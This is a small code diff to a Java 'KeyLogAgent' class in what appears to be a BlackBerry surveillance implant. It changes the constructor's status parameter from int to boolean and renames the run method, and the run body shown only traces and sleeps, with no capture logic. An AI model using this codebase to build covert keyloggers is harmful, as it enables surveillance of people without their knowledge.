@@ -6,17 +6,17 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class KeyLogAgent extends Agent {
     static Debug debug = new Debug("KeyLogAgent", DebugLevel.VERBOSE);
 
-    public KeyLogAgent(int agentStatus) {
+    public KeyLogAgent(boolean agentStatus) {
         super(Agent.AGENT_KEYLOG, agentStatus, true);
 
     }
 
-    protected KeyLogAgent(int agentStatus, byte[] confParams) {
+    protected KeyLogAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
+    public void actualRun() {
         debug.trace("run");
         this.sleepUntilStopped();
 
